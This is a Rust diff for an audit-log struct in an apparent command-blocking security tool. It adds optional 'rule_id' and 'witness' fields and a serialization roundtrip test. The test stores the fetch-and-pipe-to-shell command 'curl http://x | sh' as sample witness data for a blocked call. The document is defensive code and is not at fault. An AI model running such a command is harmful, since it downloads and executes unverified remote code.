@@ -32,6 +32,18 @@ pub struct AuditEvent {
     /// existed.
     #[serde(default, skip_serializing_if = "Option::is_none")]
     pub hook_phase: Option<String>,
+
+    /// The addressable id of the rule (or fixed enforcement layer) behind the
+    /// decision. Lets `sentinel why` find the rule text without the payload.
+    /// Same compat discipline as `call_id`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub rule_id: Option<String>,
+
+    /// What matched: a canonicalized path, a bounded command fragment, or a
+    /// tool name. Never a secret (secret rules log `rule_id` only). Same
+    /// compat discipline as `call_id`.
+    #[serde(default, skip_serializing_if = "Option::is_none")]
+    pub witness: Option<String>,
 }
 
 // THE JOIN CONTRACT (when ghost + sentinel are both current):
@@ -287,6 +299,8 @@ mod tests {
             call_id,
             tool_use_id: None,
             hook_phase: None,
+            rule_id: None,
+            witness: None,
         }
     }
 
@@ -352,6 +366,21 @@ mod tests {
             line,
             r#"{"timestamp":"2026-07-13T00:00:00+00:00","tool_name":"Bash","action":"block","reason":"pipe to shell execution","matched_rule":"deny.commands[0]","mode":"enforce"}"#
         );
+    }
+
+    #[test]
+    fn rule_id_and_witness_roundtrip_and_stay_absent_when_none() {
+        let mut ev = event(None);
+        ev.rule_id = Some("deny.commands:0a1b2c3d".into());
+        ev.witness = Some("curl http://x | sh".into());
+        let line = serde_json::to_string(&ev).unwrap();
+        let back: AuditEvent = serde_json::from_str(&line).unwrap();
+        assert_eq!(back.rule_id.as_deref(), Some("deny.commands:0a1b2c3d"));
+        assert_eq!(back.witness.as_deref(), Some("curl http://x | sh"));
+        // the all-None shape is pinned byte-for-byte by the test above; here
+        // just confirm neither key leaks when unset.
+        let bare = serde_json::to_string(&event(None)).unwrap();
+        assert!(!bare.contains("rule_id") && !bare.contains("witness"));
     }
 
     #[test]
